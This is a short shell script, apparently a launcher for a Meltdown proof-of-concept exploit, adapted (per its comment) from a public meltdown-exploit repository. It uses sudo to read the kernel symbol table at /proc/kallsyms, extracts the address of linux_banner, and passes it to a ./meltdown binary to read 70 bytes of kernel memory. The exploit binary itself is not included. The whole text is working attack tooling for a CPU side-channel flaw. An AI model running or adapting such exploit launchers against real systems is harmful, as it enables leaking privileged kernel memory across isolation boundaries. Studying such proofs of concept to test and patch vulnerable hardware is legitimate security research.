#!/bin/sh

find_linux_banner() {
	$2 sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_banner$/\1/p' $1
}

linux_banner=$(\find_linux_banner /proc/kallsyms sudo)

echo "begin from $linux_banner, size 70"

./meltdown $linux_banner 70
#参考https://github.com/paboldin/meltdown-exploit/blob/master/run.sh